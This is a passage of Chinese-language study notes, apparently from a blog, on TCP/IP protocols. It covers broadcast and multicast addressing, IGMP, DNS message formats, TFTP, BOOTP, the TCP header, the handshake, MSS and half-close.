<li>三种IP地址：单播地址、广播地址和多播地址。</li>
<li>广播和多播仅应用于UDP，它们对需要将报文同时传往多个接收者的应用来说十分重要</li>
<li>TCP是一个面向连接的协议，它意味着分别运行于两主机（由IP地址确定）内的两进程（由端口号确定）间存在一条连接</li>
<li>有时一个主机要向网上的所有其他主机发送帧，这就是广播。通过ARP和RARP可以看到这一过程</li>
<li>多播处于单播和广播之间：帧仅传送给属于多播组的多个主机</li>
</ul>
<h2 id="协议栈各层对收到帧的过滤过程"><a href="#协议栈各层对收到帧的过滤过程" class="headerlink" title="协议栈各层对收到帧的过滤过程"></a>协议栈各层对收到帧的过滤过程</h2><ul>
<li>网卡查看帧，确定是否接收该帧，若接收后将它传递给设备驱动程序。网卡仅接收目的地址为网卡物理地址或广播地址的帧。如果多接口设置为混合模式，能接收每个帧的一个复制；</li>
<li>设备驱动程序将进行另外的帧过滤：<br>1）帧类型中必须指定要使用的协议；<br>2）进行多播过滤来检测该主机是否属于多播地址说的多播组</li>
<li>设备驱动程序将数据帧传递给IP层（如果为IP类型的数据报）。IP根据IP地址中源地址和目的地址进行更多的过滤检测。如果正常，将数据报传递给下一层；</li>
<li>UDP根据IP层传递数据中目的端口来进行过滤。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170425212507.jpg" alt=""></li>
</ul>
<h2 id="广播"><a href="#广播" class="headerlink" title="广播"></a>广播</h2><ul>
<li>受限的广播255.255.255.255</li>
<li>指向网络的广播10.255.255.255 192.168.1.255</li>
<li>指向子网的广播10.11.255.10.1.255.255</li>
<li>指向所有子网的广播10.255.255.255</li>
<li>主机处理的地址192.168.255.255（cisco路由器支持）</li>
<li>路由器支持255.255.255.255，主机不支持（当主机处理）</li>
</ul>
<h2 id="多播"><a href="#多播" class="headerlink" title="多播"></a>多播</h2><p>IP多播提供两类服务：</p>
<ul>
<li>向多个目的地址发送数据；</li>
<li>客户对服务器的请求。</li>
</ul>
<h3 id="多播组地址"><a href="#多播组地址" class="headerlink" title="多播组地址"></a>多播组地址</h3><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170425215329.jpg" alt=""></p>
<ul>
<li>多播组地址包括为1110的最高4bit和多播组号。它们通常可表示为点分十进制数，范围从224.0.0.0到239.255.255.255</li>
<li>能够接收发往一个特定多播组地址数据的主机集合称为主机组（host group）。一个主机组可以跨越多个网络。主机组中成员可随机加入或离开主机组，主机组中对主机的数量没有限制，同时不属于某一个主机组的主机可以向该组发送信息</li>
<li>一些多播组地址被IANA确定为知名地址。它们也被当做用久主机组，这和TCP及UDP中的熟知端口相似</li>
</ul>
<h3 id="多播组地址到以太网地址的转换"><a href="#多播组地址到以太网地址的转换" class="headerlink" title="多播组地址到以太网地址的转换"></a>多播组地址到以太网地址的转换</h3><p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160406160845156-123233528.png" alt=""></p>
<ul>
<li>IANA拥有一个以太网地址块，即高位24bit为00:00:5e（十六进制表示），这意味着该地址块所拥有的地址范围从00:00:5e:00:00:00到00:00:5e:ff:ff:ff。IANA将其中的一半（高位的第四个字节的高四位分成0~7和8~f两半，这样是分成了整体的一半）分配为多播地址。为了指明一个多播地址，任何一个以太网地址的首字节必须是01，这意味着与IP多播相对应的以太网地址范围从01:00:5e:00:00:00到01:00:5e:7f:ff:ff（7f这个就是一半）。</li>
<li>由于7的二进制是0111，所以高位0是确定的了，因此以太网地址的前三个字节01:00:5e和下一位0确定了25bit。剩下的23bit和IP地址的低23bit相同。这样D类地址中高9bit中的低5bit就被忽略了。 –这样带来一个问题，5bit被忽略，那么表示会有32（2的5次方）个不同的多播号映射成了相同的以太网地址…比如：224.128.64.32和224.0.64.32都映射为同一以太网地址01:00:5e:00:40:20。</li>
<li>既然地址映射是不唯一的，那么设备驱动程序或IP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能，设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</li>
</ul>
<h1 id="IGMP：Internet组管理协议"><a href="#IGMP：Internet组管理协议" class="headerlink" title="IGMP：Internet组管理协议"></a>IGMP：Internet组管理协议</h1><p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160407122404140-1999656219.png" alt=""></p>
<ul>
<li>IGMP协议让一个物理网络上的所有系统知道主机当前所在的多播组。多播路由器需要这些信息以便知道多播数据报应该向哪些接口转发。 </li>
<li>正如ICMP一样，IGMP也被当作IP层的一部分。IGMP报文通过IP数据报进行传输。不像我们已经见到的其他协议，IGMP有固定的报文长度，没有可选数据</li>
</ul>
<h2 id="IGMP报文"><a href="#IGMP报文" class="headerlink" title="IGMP报文"></a>IGMP报文</h2><p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160407122411187-535768858.png" alt=""></p>
<ul>
<li>这是版本为1的IGMP。IGMP类型为1说明是由多播路由器发出的查询报文，为2说明是主机发出的报告报文（多播路由器发出的是查询类型的报文，网络上的主机发送的是报告类型的报文）。检验和的计算和IGMP协议相同，同样覆盖首部和数据部分。</li>
<li>组地址为D类IP地址。在查询报文中组地址设置为0，在报告报文中组地址为要参加的组地址。</li>
</ul>
<h2 id="IGMP报告和查询"><a href="#IGMP报告和查询" class="headerlink" title="IGMP报告和查询"></a>IGMP报告和查询</h2><p>多播路由器使用IGMP报文来记录与该路由器相连网络中组成员的变化情况。使用规则如下：</p>
<ul>
<li>当第一个进程加入一个组时，主机就发送一个IGMP报告。如果一个主机的多个进程加入同一组，只发送一个IGMP报告。这个报告被发送到进程加入组所在的同一接口上。</li>
<li>进程离开一个组时，主机不发送IGMP报告，即便是组中的最后一个进程离开。主机知道在确定的组中已不再有组成员后，在随后收到的IGMP查询中就不再发送报告报文。</li>
<li>多播路由器定时发送IGMP查询来了解是否还有任何主机包含有属于多播组的进程。多播路由器必须向每个接口发送一个IGMP查询。因为路由器希望主机对它加入的每个多播组均发回一个报告，因此IGMP查询报文中的组地址被设置为0。</li>
<li>主机通过发送IGMP报告来响应一个IGMP查询，对每个至少还包含一个进程的组均要发回IGMP报告。</li>
</ul>
<p>使用这些查询和报告报文，多播路由器对每个接口保持一个表，表中记录接口上至少还包含一个主机的多播组（多播路由只关心是不是至少有一个，有一个就得转发）。当路由器收到要转发的多播数据报时，它只将该数据报转发到（使用相应的多播链路层地址）还拥有属于那个组主机的接口上。</p>
<p>如图：查询和报告的报文。显示了两个IGMP报文，一个是主机发送的报告，另一个是路由器发送的查询。该路由器正在要求那个接口上的每个主机说明它加入的每个多播组</p>
<p><img src="http://images2015.cnblogs.com/blog/680022/201604/680022-20160407123400375-1952921020.png" alt=""></p>
<h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><p>实现IGMP的几个细节：</p>
<ul>
<li>当一个主机首次发送IGMP报告（当第一个进程加入一个多播组）时，并不保证该报告被可靠接收（因为使用的是IP交付服务）。下一个报告将在间隔一段时间后发送。这个时间间隔由主机在 0 ~ 1 0秒的范围内随机选择。 </li>
<li>当一个主机收到一个从路由器发出的查询后，并不立即响应，而是经过一定的时间间隔后才发出一些响应s（一个主机可能不止一个多播组，有几个就要发送几个响应）。</li>
</ul>
<h1 id="DNS：域名系统"><a href="#DNS：域名系统" class="headerlink" title="DNS：域名系统"></a>DNS：域名系统</h1><h2 id="引言-2"><a href="#引言-2" class="headerlink" title="引言"></a>引言</h2><p>域名系统（DNS）是一种用于TCP/IP应用程序的分布式数据库，它提供主机名字和IP地址之间的转换及有关电子邮件的选路信息。</p>
<h2 id="DNS基础"><a href="#DNS基础" class="headerlink" title="DNS基础"></a>DNS基础</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501144713.jpg" alt=""></p>
<ul>
<li>DNS的名字空间和Unix的文件系统相似，也具有层次结构</li>
<li>每个结点（图14-1中的圆圈）有一个至多63个字符长</li>
<li>以点“.”结尾的域名称为绝对域名或完全合格的域名FQDN(Full Qualified Domain Name)</li>
<li><p>顶级域名被分为三个部分：<br>  1）arpa是一个用做地址到名字转换的特殊域<br>  2）7个3字符长的普通域，也称组织域<br>  3）所有2字符长的域均是基于ISO3166中定义的国家代码，这些域称为国家域，或地理域<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501144946.jpg" alt=""></p>
</li>
<li><p>一个独立管理的DNS子树称为一个区域（zone）</p>
</li>
<li>DNS的一个基本特征是使用超高速缓存。即当一个名字服务器收到有关映射的信息（主机名字到IP地址）时，它会将该信息存放在高速缓存中。这样若以后遇到相同的映射请求，就能直接使用缓存中的结果而不需通过其他服务器查询</li>
</ul>
<h2 id="DNS的报文格式"><a href="#DNS的报文格式" class="headerlink" title="DNS的报文格式"></a>DNS的报文格式</h2><p>DNS定义了一个用于查询和响应的报文格式。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501145012.jpg" alt=""></p>
<ul>
<li>这个报文由12字节长的首部和4个长度可变的字段组成</li>
<li>标识字段由客户程序设置并有服务器返回结果。客户程序通过它来确定响应与查询是否匹配</li>
<li>16bit的标志字段被划分为若干子字段<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501145036.jpg" alt=""><br>   1）QR是1bit字段：0表示查询报文，1表示响应报文<br>   2）opcode是一个4bit字段：通常值为0（标准查询），其他值为1（反向查询）和2（服务器状态请求）<br>   3）AA是1bit标志，表示“授权回答”。该名字服务器是授权于该域的<br>   4）TC是1bit字段，表示“可截断的”。使用UDP时，它表示当应答的总长度超过512字节时，只返回前512个字节<br>   5）RD是1bit字段表示“期望递归”。该比特能在一个查询中设置，并在响应中返回。这个标志告诉名字服务必须处理这个查询，也称为一个递归查询。<br>   6）RA是1bit字段，表示“可用递归”。如果名字服务器支持递归查询，则在响应中该比特设置为1.<br>   7）随后的3bit字段必须为0<br>   8）recode是一个4bit的返回码字段。通常的值为0（没有差错）和3（名字差错）。名字差错只有从一个授权名字服务器上返回，它表示在查询中指定的域名不存在<br>   9）随后的4个16bit字段说明最后4个变长字段中包含的条目数。对于查询报文，问题数通常为1，而其他3项则均为0.</li>
</ul>
<h3 id="DNS查询报文中的问题部分"><a href="#DNS查询报文中的问题部分" class="headerlink" title="DNS查询报文中的问题部分"></a>DNS查询报文中的问题部分</h3><p>问题部分中每个问题的格式如图14-5所示，通常只有一个问题<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501145102.jpg" alt=""></p>
<ul>
<li>查询名是要查找的名字，它是一个或多个标识符的序列。每个标识符以首字节的计数值来说明随后标识符的字节长度，每个名字以最后字节为0结束，长度为0的标识符是根标识符。计数字节的值必须是0-63的数，因为标识符最大长度仅为63.</li>
<li>每个问题有一个查询类型，而每个响应（也称一个资源记录）也有一个类型。</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501145125.jpg" alt=""></p>
<ul>
<li>最常用的查询类型是A类型，表示期望获得查询名的IP地址。一个PTR查询则请求获得一个IP地址对应的域名</li>
<li>查询类通常是1，指互联网地址</li>
</ul>
<h3 id="DNS响应报文中的资源记录部分"><a href="#DNS响应报文中的资源记录部分" class="headerlink" title="DNS响应报文中的资源记录部分"></a>DNS响应报文中的资源记录部分</h3><p>DNS报文中最后的是三个字节，回答字段、授权字段和附加信息字段，均采用一种称为资源记录RR的相同格式。</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501145150.jpg" alt=""></p>
<ul>
<li>域名是记录中资源数据对应的名字</li>
<li>类型说明RR的类型码。它的值和查询类型值是一样的，类通常为1，值Internet数据</li>
<li>生成时间字段是客户程序保留该资源记录的秒数，通常的生成时间自为2天</li>
<li>资源数据长度说明资源的数量</li>
</ul>
<h2 id="指针查询"><a href="#指针查询" class="headerlink" title="指针查询"></a>指针查询</h2><ul>
<li>即给定一个IP地址，返回与该地址对应的域名</li>
<li>查询结果包含一个回答RR，且为授权回答比特置1.RR的类型是PTR，资源数据中包含该域名</li>
</ul>
<h2 id="主机名检查"><a href="#主机名检查" class="headerlink" title="主机名检查"></a>主机名检查</h2><p>当一个IP数据报到达一个作为服务器的主机时，无论是UDP数据报还是TCP连接请求，服务器进程所能获得的是客户的IP地址和端口号（UDP和TCP）。</p>
<h2 id="资源记录"><a href="#资源记录" class="headerlink" title="资源记录"></a>资源记录</h2><p>资源记录（RR）：IP地址查询为A类型，指针查询为类型FTR。由名字服务器返回的资源记录：回答RR、授权RR和附加信息RR。现有大约20种不同类型的资源记录。</p>
<ul>
<li>A：一个A记录定义了一个IP地址，它存储32bit的二进制数</li>
<li>PTR：指针记录用于指针查询</li>
<li>CNAME：这表示“规范名字（canonical name）”。它用来表示一个域名，而有规范名字的域名通常被称为别名</li>
<li>HINFO:表示主机信息：包括说明主机CPU和操作系统的两个字符串。并非所有的站点均提供它们系统的HINFO记录，并且提供的信息也可能不是最新的</li>
<li>MX:邮件交换记录</li>
<li>NS:名字服务器记录</li>
</ul>
<h2 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h2><ul>
<li>为了减少Internet上DNS的通信量，所有的名字服务器均使用高速缓存。</li>
<li>在标准的Unix实现中，高速缓存是由名字服务器而不是由名字解析器维护的。</li>
</ul>
<h1 id="TFTP：简单文件传送协议"><a href="#TFTP：简单文件传送协议" class="headerlink" title="TFTP：简单文件传送协议"></a>TFTP：简单文件传送协议</h1><h2 id="引言-3"><a href="#引言-3" class="headerlink" title="引言"></a>引言</h2><ul>
<li>TFTP（Trivial File Transfer Protocol）即简单文件传送协议，最初打算用于引导无盘系统</li>
<li>TFTP使用UDP</li>
<li>TFTP的代码（和它需要的UDP、IP和设备驱动程序）都能适合只读存储器</li>
</ul>
<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><ul>
<li>在开始工作时，T F T P的客户与服务器交换信息，客户发送一个读请求或写请求给服务器。在一个无盘系统进行系统引导的正常情况下，第一个请求是读请求（ R R Q）。</li>
<li>T F T P报文的头两个字节表示操作码。对于读请求和写请求（ W R Q），文件名字段说明客户要读或写的位于服务器上的文件。这个文件字段以 0字节作为结束（见图 1 5 - 1）。模式字段是一个A S C I I码串n e t a s c i i或o c t e t（可大小写任意组合），同样以0字节结束。n e t a s c i i表示数据是以成行的A S C I I码字符组成，以两个字节 — 回车字符后跟换行字符（称为C R / L F）作为行结束符。</li>
<li>每个数据分组包含一个块编号字段，它以后要在确认分组中使用。</li>
<li>在写请求的情况下，TFTP 客户发送W R Q指明文件名和模式。如果该文件能被 该客户写，TFTP 服务器就返回块编号为 0的A C K包。该客户就将文件的头 5 1 2字节以块编号为1发出。服务器则返回块编号为1的A C K。这种类型的数据传输称为停止等待协议。</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501150021.jpg" alt=""></p>
<ul>
<li>最后一种T F T P报文类型是差错报文，它的操作码为 5。它用于服务器不能处理读请求或写请求的情况。在文件传输过程中的读和写差错也会导致传送这种报文，接着停止传输。差错编号字段给出一个数字的差错码，跟着是一个 A S C I I表示的差错报文字段，可能包含额外的操作系统说明的信息。</li>
<li>既然T F T P使用不可靠的U D P，T F T P就必须处理分组丢失和分组重复。分组丢失可通过发送方的超时与重传机制解决（注意存在一种称为“魔术新手综合症 ( s o r c e r e r’s apprentices y n d r o m e )”的潜在问题，如果双方都超时与重传，就可能出现这个问题。</li>
</ul>
<h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><ul>
<li>在T F T P分组（图1 5 - 1）中并不提供用户名和口令。这是 T F T P的一个特征（即“安全漏洞”）。由于T F T P是设计用于系统引导进程，它不可能提供用户名和口令。</li>
<li>目前大多数 T F T P服务器提供了一个选项来限制只能访问特定目录下的文件（U n i x系统中通常是/ t f t p b o o t）。这个目录中只包含无盘系统进行系统引导时所需的文件</li>
</ul>
<h1 id="BOOTP：引导程序协议"><a href="#BOOTP：引导程序协议" class="headerlink" title="BOOTP：引导程序协议"></a>BOOTP：引导程序协议</h1><h2 id="引言-4"><a href="#引言-4" class="headerlink" title="引言"></a>引言</h2><ul>
<li>无盘系统在不知道自身IP地址的情况下，在进行系统引导时能够通过RARP来获取它的IP地址。然而使用RARP有两个问题：（1）I P地址是返回的唯一结果；（2）既然R A R P使用链路层广播， R A R P请求就不会被路由器转发（迫使每个实际网络设置一个RARP 服务器）</li>
<li>BOOTP（引导程序协议）是一种用于无盘系统进行系统引导的替代方法</li>
<li>BOOTP使用UDP，且通常需与TFTP协同工作</li>
</ul>
<h2 id="BOOTP的分组格式"><a href="#BOOTP的分组格式" class="headerlink" title="BOOTP的分组格式"></a>BOOTP的分组格式</h2><p>BOOTP 请求和应答均被封装在U D P数据报中，如图1 6 - 1所示。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501151809.jpg" alt=""></p>
<p>图1 6 - 2显示了长度为3 0 0字节的B O O T P请求和应答的格式。<br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170501151910.jpg" alt=""></p>
<ul>
<li>“操作码”字段为1表示请求，为2表示应答。硬件类型字段为 1表示10 Mb/s的以太网</li>
<li>“跳数”字段由客户设置为0，但也能被一个代理服务器设置</li>
<li>“事务标识”字段是一个由客户设置并由服务器返回的 32 bit整数。客户用它对请求和应答进行匹配。对每个请求，客户应该将该字段设置为一个随机数。    </li>
<li>客户开始进行引导时，将“秒数”字段设置为一个时间值。服务器能够看到这个时间值，备用服务器在等待时间超过这个时间值后才会响应客户的请求，这意味着主服务器没有启动。</li>
<li>如果该客户已经知道自身的 I P地址，它将写入“客户 I P地址”字段。否则，它将该字段设置为0。对于后面这种情况，服务器用该客户的 I P地址写入“你的 I P地址”字段。“服务器I P地址”字段则由服务器填写。如果使用了某个代理服务器（见 1 6 . 5节），则该代理服务器就填写“网关I P地址”字段。</li>
<li>客户必须设置它的“客户硬件地址”字段。尽管这个值与以太网数据帧头中的值相同，U D P数据报中也设置这个字段，但任何接收这个数据报的用户进程能很容易地获得它（例如一个BOOTP 服务器）。一个进程通过查看U D P数据报来确定以太网帧首部中的该字段通常是很困难的（或者说是不可能的）。</li>
<li>“服务器主机名”字段是一个空值终止串，由服务器填写。服务器还将在“引导文件名字段”填入包括用于系统引导的文件名及其所在位置的路径全名。</li>
<li>“特定厂商区域”字段用于对B O O T P进行不同的扩展。</li>
</ul>
<h3 id="端口号-1"><a href="#端口号-1" class="headerlink" title="端口号"></a>端口号</h3><p>B O O T P有两个熟知端口：BOOTP 服务器为6 7，BOOTP 客户为6 8。</p>
<h1 id="TCP：传输控制协议"><a href="#TCP：传输控制协议" class="headerlink" title="TCP：传输控制协议"></a>TCP：传输控制协议</h1><h2 id="TCP的服务"><a href="#TCP的服务" class="headerlink" title="TCP的服务"></a>TCP的服务</h2><ul>
<li>TCP提供一种面向连接的、可靠的字节流服务</li>
<li>面向连接意味着两个使用TCP的应用（通常是一个客户和一个服务器）在彼此交换数据之间必须先建立一个TCP连接</li>
<li>在一个TCP连接中，仅有两方进行彼此通信</li>
</ul>
<h3 id="TCP通过下列方式来提供可靠性"><a href="#TCP通过下列方式来提供可靠性" class="headerlink" title="TCP通过下列方式来提供可靠性"></a>TCP通过下列方式来提供可靠性</h3><ul>
<li>应用数据被分隔成TCP认为最适合发送的数据块</li>
<li>当TCP发出一个段后，它启动一个定时器，等待目的端确认收到这个报文段。如果不能及时收到一个确认，将重发这个报文段</li>
<li>当TCP收到发自TCP连接另一端的数据，它将发送一个确认。这个确认不是立即发送，通常将推迟几分之一秒</li>
<li>TCP将保持它首部和数据的检验和</li>
<li>既然TCP报文段作为IP数据报来传输，而IP数据报的到达可能会失序，因此TCP报文段的到达可能会失序。如果必要，TCP将对收到的数据进行重新排序，将收到的数据以正确的顺序交给应用层</li>
<li>既然IP数据报会发生重复，TCP的接收端必须丢弃重复的数据</li>
<li>TCP还能提供流量控制。TCP连接的每一方都有固定大小的缓冲空间。TCP的接收端只允许另一端发送接收端缓冲区所能接纳的数据。这将防止较快主机致使较慢主机的缓冲区溢出</li>
</ul>
<h3 id="TCP的字节流"><a href="#TCP的字节流" class="headerlink" title="TCP的字节流"></a>TCP的字节流</h3><ul>
<li>两个应用程序通过TCP连接交换8 bit构成的字节流。TCP不在字节流中插入记录标识符。将这称为字节流服务。</li>
<li>假设一方的应用程序先传10字节，又传20字节，再传50字节，连接的另一方将无法了解发方每次发送了多少字节。收方可以分4次接收这80个字节，每次接收20字节。</li>
<li>TCP对字节流的内容不作任何解释，它不知道传输的数据字节流是二进制数据、ASCII字符、EBCDIC字符或其他类型数据。由TCP双方的应用层对字节流进行解释。</li>
</ul>
<h2 id="TCP的首部"><a href="#TCP的首部" class="headerlink" title="TCP的首部"></a>TCP的首部</h2><p>TCP数据被封装在一个IP数据报中<br><img src="http://images.cnitblog.com/blog2015/697266/201504/221940145468929.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/221941291718831.png" alt=""></p>
<ul>
<li>每个TCP段都包含源端和目的端的端口号，用于寻找发端和收端应用进程。这两个值加上IP首部中的源端IP地址和目的端IP地址唯一确定一个TCP连接</li>
<li>一个IP地址和一个端口号也称为一个插口（socket）。插口对（socket pair）（包含客户IP地址、客户端口号、服务器IP地址和服务器端口号的四元组）可唯一确定互联网网络中每一个TCP连接的双方</li>
<li>序号用来标识从TCP发端向收端发送的数据字节流。如果将字节流看作是在两个应用程序间的单向流动，则TCP用序号对每个字节进行计数。序号是32 bit的无符号数，到达2^32-1后又从0开始。SYN标志消耗了一个序号</li>
<li>因为每个传输的字节都被计数，确认序号包含发送确认的一端所期望收到的下一个序号，即确认序号是上次已成功收到数据字节序号加1。只有ACK标志为1时确认序号字段才有效</li>
<li>发送ACK无需占用任何序号，因为32 bit的确认序号字段和ACK标志一样，总是TCP首部的一部分。因此，一旦一个连接建立起来，这个字段总是被设置，ACK标志也总是被设置为1。</li>
<li>首部长度给出首部中32 bit字的数目。需要这个值是因为任选字段的长度是可变的。这个字段占4 bit，因此TCP最多有60字节的首部（32bit*(2^4-1)）。如果没有选项字段，正常的长度是20字节。</li>
<li>TCP为应用层提供全双工服务。这意味数据能在两个方向上独立地进行传输。因此，连接的每一端必须保持每个方向上的传输数据序号</li>
<li>TCP的流量控制由连接的每一端通过声明的窗口大小来提供。窗口大小为字节数，起始于确认序号字段指明的值，这个值是接收端期望接收的字节。窗口大小是一个16 bit字段，因而窗口大小最大为65535字节。</li>
<li>检验和覆盖了整个TCP报文段包括TCP首部和TCP数据。这是一个强制性的字段，一定是由发端计算和存储，并由收端进行验证。<br>说明：TCP检验和的计算与UDP检验和的计算相似，使用一个伪首部。</li>
<li>只有当URG标志置1时紧急指针才有效。紧急指针是一个正的偏移量，和序号字段中的值相加表示紧急数据最后一个字节的序号。TCP的紧急方式是发送端向另一端发送紧急数据的一种方式。</li>
<li>最常见的选项字段是最长报文大小，又称为MSS (Maximum Segment Size)。每个连接方通常都在通信的第一个报文段（为建立连接而设置SYN标志的那个段）中指明这个选项。它指明本端所能接收的最大长度的报文段。</li>
<li>TCP报文段中的数据部分是可选的。例如：一个连接建立和终止时，双方交换的报文段仅有TCP首部。在处理超时的许多情况中，也会发送不带任何数据的报文段。</li>
</ul>
<h3 id="TCP首部中有6个标志比特"><a href="#TCP首部中有6个标志比特" class="headerlink" title="TCP首部中有6个标志比特"></a>TCP首部中有6个标志比特</h3><p>可同时多个被设置为1</p>
<ul>
<li>URG        紧急指针有效</li>
<li>ACK        确认序号有效</li>
<li>PSH        接收方应该尽快将这个报文段交给应用层</li>
<li>PST        重建连接</li>
<li>SYN        同步序号用来发起一个连接。</li>
<li>FIN        发端完成发送任务</li>
</ul>
<h1 id="TCP连接的建立与终止"><a href="#TCP连接的建立与终止" class="headerlink" title="TCP连接的建立与终止"></a>TCP连接的建立与终止</h1><h2 id="引言-5"><a href="#引言-5" class="headerlink" title="引言"></a>引言</h2><ul>
<li>TCP是一个面向连接的协议。无论哪一方向另一方发送数据之前，都必须先在双方之间<br>建立一条连接。本章将详细讨论一个 T C P连接是如何建立的以及通信结束后是如何终止的。</li>
<li>这种两端间连接的建立与无连接协议如 U D P不同。我们在第 11章看到一端使用U D P向另<br>一端发送数据报时，无需任何预先的握手。</li>
</ul>
<h2 id="建立连接协议"><a href="#建立连接协议" class="headerlink" title="建立连接协议"></a>建立连接协议</h2><h3 id="建立连接协议-1"><a href="#建立连接协议-1" class="headerlink" title="建立连接协议"></a>建立连接协议</h3><p>如18-3所示，为了建立一条TCP连接：<br><img src="http://images.cnitblog.com/blog2015/697266/201504/222117276092162.png" alt=""></p>
<ul>
<li>请求端（客户）发送一个SYN段指明客户打算连接的服务器的端口，以及初始序号（ISN，例子中为1415531521），如报文1。</li>
<li>服务器发回包含服务器的初始序号的SYN报文段（报文段2）作为应答。同时，将确认序号设置为客户的ISN加1以对客户的SYN报文段进行确认。一个SYN将占用一个序号。</li>
<li>客户必须将确认序号设置为服务器的ISN加1以对服务器的SYN报文段进行确认（报文段3）。</li>
</ul>
<p>这三个报文段完成连接的建立，这个过程也称为三次握手。</p>
<p>说明：</p>
<ul>
<li><p>发送第一个SYN的一端将执行主动打开，接收这个SYN并发回下一个SYN的另一端执行被动打开。</p>
</li>
<li><p>当一端为建立连接而发送它的SYN时，它为连接选择一个初始序号。ISN随时间而变化，因此每个连接都将具有不同的ISN。</p>
</li>
</ul>
<h3 id="终止连接"><a href="#终止连接" class="headerlink" title="终止连接"></a>终止连接</h3><p>终止一个连接要经过4次握手。这是由TCP的半关闭造成的。<br>说明：</p>
<ul>
<li>因为TCP是全双工的（数据在两个方向上能同时传递），因此每个方向必须单独进行关闭。原则是：当一方完成它的数据发送任务后发送一个FIN来终止这个方向连接。当一端收到一个FIN时，它必须通知应用层另一端已经终止了那个方向的数据传送。</li>
</ul>
<p>注意：发送FIN通常是应用层进行关闭的结果。</p>
<ul>
<li>收到一个FIN只意味着在这一方向上没有数据流动。</li>
</ul>
<p>注意：一个TCP连接在收到一个FIN后仍能发送数据，这对利用半关闭的应用来说是可能的，尽管在实际应用中只有很少的TCP应用程序这样做。</p>
<p>图18-4显示了终止一个连接的典型握手顺序。<br><img src="http://images.cnitblog.com/blog2015/697266/201504/222146082184141.png" alt=""><br>发送FIN将导致应用程序关闭它们的连接，这些FIN的ACK是由TCP软件自动产生的。</p>
<h2 id="最大报文段长度"><a href="#最大报文段长度" class="headerlink" title="最大报文段长度"></a>最大报文段长度</h2><ul>
<li>最大报文段长度（MSS）表示TCP传往另一端的最大块数据的长度。当一个连接建立时，连接的双方都要通告各自的MSS。</li>
<li>当建立一个连接时，每一方都有用于通告它期望接收的MSS选项（MSS选项只能出现在SYN报文段中）。如果一方不接收来自另一-*    方的MSS值，则MSS就定为默认值536字节（这个默认值允许20字节的IP首部和20字节的TCP首部以适合576字节IP数据报。</li>
</ul>
<p>注意：</p>
<p>（1）一般说来，如果没有分段发生，MSS越大越好。报文段越大允许每个报文段传送的数据就越多，相对IP和TCP首部有更高的网络利用率。</p>
<p>（2）当TCP发送一个SYN时，或者是因为一个本地应用进程想发起一个连接，或者是因为另一端的主机收到了一个连接请求，它能将MSS值设置为外出接口上的MTU长度减去固定的IP首部和TCP首部长度。</p>
<p>（3）如果目的IP地址为“非本地的(non-local)”，MSS通常的默认值为536。</p>
<p>说明：区分地址是本地还是非本地的方法是：如果目的IP地址的网络号与子网号都与本机相同，则是本地的；如果目的IP地址的网络号与本机相同而子网号不同，则可能是本地的，也可能是非本地的。</p>
<p>（4）MSS使得主机限制另一端发送数据报的长度。加上主机也能控制它发送数据报的长度，这使得以较小MTU连接到一个网络上的主机避免分段。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/241932528289870.png" alt=""><br>主机sun向slip发起一个TCP连接，利用tcpdump命令来观察报文段：<br><img src="http://images.cnitblog.com/blog2015/697266/201504/241934592035362.png" alt=""></p>
<p>说明：</p>
<p>（1）sun发送的报文段不能超过256字节的数据，因为slip已经告知它的MSS值为256。（上图第二个红框）</p>
<p>（2）slip知道它外出接口的MTU长度为296，所以即使sun已经告诉它的MSS为1460（上图第一个红框），但为避免将数据分段，它不会发送超过256字节数据的报文段。</p>
<p>（<br>3）如果两端主机都连接到以太网上，都采用536的MSS，但中间网络采用296的MTU，同样会出现分段。</p>
<h2 id="TCP的半关闭"><a href="#TCP的半关闭" class="headerlink" title="TCP的半关闭"></a>TCP的半关闭</h2><p>TCP提供了连接的一端在结束它的发送后还能接收来自另一端数据的能力，即半关闭。</p>
<p>注意：很少有应用程序使用它，如果想要使用这个功能，需要编程接口提供一个方式来说明。</p>
<p>下面给出一个例子：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/241948297963788.png" alt=""></p>
<p>意思是这样的：客户结束了发送数据（发送了FIN），服务器发送ACK表示确认后，仍然可以发送数据给客户（图中红框）。</p>
<h2 id="TCP的状态变迁图"><a href="#TCP的状态变迁图" class="headerlink" title="TCP的状态变迁图"></a>TCP的状态变迁图</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/241955122346274.png" alt=""></p>
<h3 id="2MSL等待状态"><a href="#2MSL等待状态" class="headerlink" title="2MSL等待状态"></a>2MSL等待状态</h3><p>TIME_WAIT状态也称为2MSL等待状态。每个具体TCP实现必须选择一个报文段最大生存时间MSL（Maximum Segment Lifetime）。它是任何报文段被丢弃前在网络内的最长时间。</p>
